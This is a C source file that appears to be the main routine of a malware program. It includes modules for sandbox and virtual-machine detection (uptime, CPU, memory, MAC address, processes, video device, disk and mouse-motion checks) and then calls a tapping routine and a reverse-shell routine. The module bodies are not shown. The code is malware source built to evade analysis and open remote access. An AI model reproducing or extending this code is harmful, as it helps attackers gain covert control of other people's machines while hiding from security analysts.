#include <stdio.h>

#include "module/check_uptime.c"
#include "module/check_cpu.c"
#include "module/check_mem.c"
#include "module/check_network.c"
#include "module/check_sleep.c"
#include "module/check_process.c"
#include "module/check_wideo.c"
#include "module/check_disk.c"
#include "module/check_mouse.c"
#include "module/tapping.c"
#include "module/reverse_shell.c"


int Check_Box()
{
    int check_result = 0;
    int local_result = 0;

    local_result = 0;
    local_result = Check_Sleep();
    // printf("result Check_Sleep: %d\n", local_result);
    check_result = check_result + local_result;
    // printf("check_result: %d\n", check_result);

    // if(check_result >= 7) exit(1);
    //if(check_result >= 7) return 1;

    local_result = 0;
    local_result = Check_Uptime();
    //printf("result Check_Uptime: %d\n", local_result);
    check_result = check_result + local_result;
    // printf("check_result: %d\n", check_result);

    // if(check_result >= 7) exit(1);
    //if(check_result >= 7) return 1;

    local_result = 0;
    local_result = Check_CPU_Info();
    // printf("result Check_CPU_Info: %d\n", local_result);
    check_result = check_result + local_result;
    // printf("check_result: %d\n", check_result);

    // if(check_result >= 7) exit(1);
    //if(check_result >= 7) return 1;

    local_result = 0;
    local_result = Check_MEM_Info();
    // printf("result Check_MEM_Info: %d\n", local_result);
    check_result = check_result + local_result;
    // printf("check_result: %d\n", check_result);

    // if(check_result >= 7) exit(1);
    //if(check_result >= 7) return 1;

    local_result = 0;
    local_result = Check_MAC();
    // printf("result Check_MAC: %d\n", local_result);
    check_result = check_result + local_result;
    // printf("check_result: %d\n", check_result);

    // if(check_result >= 7) exit(1);
    //if(check_result >= 7) return 1;

    local_result = 0;
    local_result = Check_Process();
    // printf("result Check_Process: %d\n", local_result);
    check_result = check_result + local_result;
    // printf("check_result: %d\n", check_result);

    // if(check_result >= 7) exit(1);
    //if(check_result >= 7) return 1;

    local_result = 0;
    local_result = Check_First_Video_Device();
    // printf("result Check_First_Video_Device: %d\n", local_result);
    check_result = check_result + local_result;
    // printf("check_result: %d\n", check_result);

    // if(check_result >= 7) exit(1);
    //if(check_result >= 7) return 1;

    local_result = 0;
    local_result = Check_Disk_Info();
    // printf("result Check_Disk_Info: %d\n", local_result);
    check_result = check_result + local_result;
    // printf("check_result: %d\n", check_result);

    // if(check_result >= 7) exit(1);
    //if(check_result >= 7) return 1;

    local_result = 0;
    local_result = Check_Mouse_Motion();
    // printf("result Check_Mouse_Motion: %d\n", local_result);
    check_result = check_result + local_result;
    // printf("check_result: %d\n", check_result);

    // if(check_result >= 7) exit(1);
    //if(check_result >= 7) return 1;

    Tapping();

    Reverse_Shell();

    exit(0);
}